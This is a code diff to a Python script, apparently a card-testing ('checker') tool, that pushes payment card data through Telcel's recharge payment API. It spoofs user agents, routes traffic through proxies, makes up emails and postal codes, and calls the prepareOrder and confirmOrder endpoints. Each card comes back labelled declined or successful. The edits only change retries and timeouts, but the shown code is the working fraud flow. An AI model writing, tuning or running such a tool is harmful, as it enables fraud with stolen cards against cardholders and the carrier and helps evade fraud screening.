@@ -79,7 +79,7 @@ def _json(res: requests.Response):
 #Funcion principal
 def main(ccs, monto, num):
     last_err = None
-    for _attempt in range(4):
+    for _attempt in range(3):
         with requests.Session() as session:
             try:
                 ua = get_ua()
@@ -89,7 +89,7 @@ def main(ccs, monto, num):
                     session.proxies.update(prx)
                 postal_code = random.randint(10000, 16999)
                 headers = { "Host": "www.telcel.com", "Connection": "keep-alive", "sec-ch-ua-platform": "\"Android\"","Cache-Control": "no-store, no-cache, must-revalidate, max-age=0", "User-Agent": ua,  "Pragma": "no-cache",  "sec-ch-ua-mobile": "?1", "Accept": "*/*", "Sec-GPC": "1", "Accept-Language": "es-MX,es;q=0.6",  "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://www.telcel.com/personas/compra-paquetes-y-recargas", "Accept-Encoding": "gzip, deflate, br, zstd"}
-                res = session.get("https://www.telcel.com/bin/telcelcom/payment/token?device=MOBILE&module=PAQUETES_Y_RECARGAS&return_url=%2Fpersonas%2Fcompra-paquetes-y-recargas.html&family_keys=SIN_LIMITE", headers=headers, timeout=20)
+                res = session.get("https://www.telcel.com/bin/telcelcom/payment/token?device=MOBILE&module=PAQUETES_Y_RECARGAS&return_url=%2Fpersonas%2Fcompra-paquetes-y-recargas.html&family_keys=SIN_LIMITE", headers=headers, timeout=(8, 12))
                 token1 = res.text.strip()
                 if "ey" not in token1:
                     last_err = f"bad token ({len(token1)} bytes)"
@@ -103,7 +103,7 @@ def main(ccs, monto, num):
                 #   Se mandan vacíos en prepareOrder y la API responde el fingerprint.sessionId,
                 #   fingerprint.webSession y paymentId. El viejo JWT solo es el Bearer.
                 data ={"isAuth": False, "service": { "type": "RECARGA", "operationType": 2, "productType": 1, "planType": 1, "productCode": "", "mdn": num,"region": 5,  "tipoPerfil": "AMIGO", "planName": "RECARGA_SALDO", "price": int(monto),  "idproduct": resultm["key_id"], "validity": resultm["vigencia"] }, "accountId": None,"email": email(),"fingerprint": { "organizationId": "gp9h38j0", "sessionId": "", "webSession": "" }, "postalCode": post_code,"isSavedCard": False,"cardType": type,"tokenCard": numc,"lastDigits": ccs.split("|")[0][-4:]}
-                res = session.post("https://paymentservice.telcel.com/api/services/recharge/prepareOrder", headers=headers, json=data)
+                res = session.post("https://paymentservice.telcel.com/api/services/recharge/prepareOrder", headers=headers, json=data, timeout=(8, 15))
                 if "paymentId" not in res.text:
                     return {"number": num, "monto": monto, "status": "Declined ❌", "message": res.text[:200], "card": ccs.strip(), "status_resp": res.status_code}
                 _pj = _json(res)
@@ -117,7 +117,7 @@ def main(ccs, monto, num):
                             "card": ccs.strip(), "status_resp": res.status_code}
                 headers = { "sec-ch-ua-platform": "\"Android\"", "authorization": f"Bearer {token1}", "sec-ch-ua-mobile": "?1", "user-agent": ua,"accept": "application/json, text/plain, */*", "content-type": "application/json","sec-gpc": "1", "accept-language": "es-MX,es;q=0.6", "origin": "https://paymentservice.telcel.com", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors","sec-fetch-dest": "empty",  "referer": "https://paymentservice.telcel.com/payments/"}
                 data = {"generalInfo": {"mdn": num, "encryptedCvv": cvv, "userName": ""}, "vestaRequest": { "organizationId": "gp9h38j0","sessionKey": sessionid, "webSessionId": web_sess, "isRecurring": False}, "paymentId": paymentid}
-                res = session.post("https://paymentservice.telcel.com/api/services/recharge/confirmOrder", headers=headers, json=data, allow_redirects=False)
+                res = session.post("https://paymentservice.telcel.com/api/services/recharge/confirmOrder", headers=headers, json=data, allow_redirects=False, timeout=(8, 15))
                 resp_text = res.text
                 if "TRANSACCION_EXITOSA" in resp_text or "folioMotor" in resp_text or "folioTelcel" in resp_text or "operationDate" in resp_text:
                     datas=_json(res);ftc=datas.get("folioTelcel", "Null");ftm=datas.get("folioMotor", "Null");provee = datas.get("provider", "FONYOU")
